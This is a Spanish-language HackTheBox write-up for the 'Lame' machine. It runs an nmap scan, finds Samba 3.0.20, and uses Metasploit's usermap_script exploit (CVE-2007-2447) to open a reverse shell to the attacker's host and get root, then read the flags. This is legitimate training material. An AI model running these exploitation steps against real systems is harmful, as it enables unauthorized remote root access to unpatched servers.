---
title: "Lame"
description: "Writeup de la máquina Lame de HackTheBox. La primera máquina retirada de HTB, ideal para principiantes. Explotación de Samba (CVE-2007-2447) para obtener root directamente."
date: "2026-01-01"
published: true
tags: ["hackthebox", "pentesting", "writeup", "linux", "samba", "cve-2007-2447"]
readTime: "10 min"
---

# 📦 Lame — Writeup HackTheBox

## 📖 Introducción

**Lame** es, sin duda, la máquina más legendaria de **HackTheBox**. Fue la primera en ser retirada y es, para muchos, el punto de partida en la plataforma. Es una máquina **Linux** de dificultad **Fácil** que demuestra vulnerabilidades críticas en servicios antiguos.

En este writeup, explotaremos una vulnerabilidad clásica en **Samba** que nos permitirá obtener acceso como `root` sin necesidad de escalar privilegios posteriormente.

---

## 🔎 Reconocimiento

Comenzamos con nuestro escaneo estándar de **Nmap** para identificar puertos y servicios.

```bash
nmap -sVC -T4 -p- 10.10.10.3
```

**Resultados del escaneo:**

- **21/tcp (FTP):** vsftpd 2.3.4 (Famoso por tener un backdoor, aunque en esta máquina suele ser un "rabbit hole" o camino falso).
- **22/tcp (SSH):** OpenSSH 4.7p1.
- **139/445 (SMB):** Samba 3.0.20-Debian.
- **3632/tcp (distcc):** distcc v1.

El servicio que más llama la atención es **Samba 3.0.20**. Es una versión muy antigua y probablemente vulnerable.

---

## 🕵️ Enumeración y Análisis de Vulnerabilidades

### SMB (Samba 3.0.20)

Podemos usar `searchsploit` o Google para buscar vulnerabilidades asociadas a esta versión específica de Samba.

```bash
searchsploit Samba 3.0.20
```

El resultado nos apunta a una vulnerabilidad crítica: **"Username map script" Command Execution (CVE-2007-2447)**.

> **¿Qué es CVE-2007-2447?**
> Esta vulnerabilidad permite a un atacante remoto ejecutar comandos arbitrarios especificando un nombre de usuario que contenga caracteres de shell (`backticks` o comillas invertidas) durante la autenticación SMB.

---

## 🚀 Explotación

Vamos a explotar esta vulnerabilidad utilizando **Metasploit Framework** por su simplicidad y eficacia para este caso.

### Paso 1: Configuración en Metasploit

Iniciamos la consola y buscamos el módulo correspondiente.

```bash
msfconsole
search usermap_script
use exploit/multi/samba/usermap_script
```

### Paso 2: Configuración de Opciones

Configuramos la IP de la máquina víctima (`RHOSTS`) y nuestra IP de atacante (`LHOST`).

```bash
set RHOSTS 10.10.10.3
set LHOST <TU-IP-VPN>
```

Podemos verificar que todo esté correcto con `show options`.

### Paso 3: Ejecución

Lanzamos el exploit.

```bash
exploit
```

Si todo funciona correctamente, Metasploit abrirá una sesión de línea de comandos.

```bash
[*] Started reverse TCP double handler on <TU-IP>:4444 
[*] Accepted the first client connection...
[*] Command shell session 1 opened...
```

---

## 👑 Acceso Root

Una vez que tenemos la shell, verificamos qué usuario somos.

```bash
whoami
# root
```

¡Sorpresa! Esta vulnerabilidad nos otorga acceso directo como `root`, por lo que no es necesaria una fase de escalada de privilegios.

Ahora podemos buscar las banderas (flags) de usuario y root.

### User Flag

```bash
cd /home/makis
cat user.txt
```

### Root Flag

```bash
cd /root
cat root.txt
```

---

## 📝 Conclusión

**Lame** es un excelente ejemplo de por qué es crucial mantener el software actualizado. Un servicio de Samba obsoleto permitió comprometer el sistema completo en cuestión de minutos.

**Puntos clave aprendidos:**
1. Enumeración precisa de versiones (Samba 3.0.20).
2. Uso de bases de datos de exploits (Searchsploit/CVE).
3. Explotación de RCE (Remote Code Execution) en servicios de red.

¡Máquina pwned! 🚩
